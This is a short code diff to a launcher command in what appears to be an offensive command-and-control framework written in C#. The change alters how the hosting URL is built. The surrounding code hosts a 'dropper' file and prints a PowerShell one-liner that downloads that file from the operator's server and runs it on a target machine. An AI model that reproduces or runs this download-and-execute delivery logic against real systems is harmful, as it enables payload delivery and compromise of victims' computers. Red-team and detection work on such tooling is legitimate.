@@ -92,6 +92,7 @@ namespace Commander.Commands.Laucher
             {
                 //context.Terminal.WriteLine(ex.ToString());
             }
+            url += "/wh/";
 
             //context.Terminal.WriteLine($"Url Port = {urlPort}");
 
@@ -154,7 +155,7 @@ namespace Commander.Commands.Laucher
                 byte[] fileContent = File.ReadAllBytes(outPath);
                 context.CommModule.WebHost(outFile, fileContent);
 
-                string whurl = $"{url}/wh/{outFile}";
+                string whurl = $"{url}{outFile}";
                 context.Terminal.WriteLine($"[*] dropper hosted on : {whurl}");
 
                 string script = $"iwr -Uri '{whurl}' -OutFile '{outFile}'; .\\{outFile}";
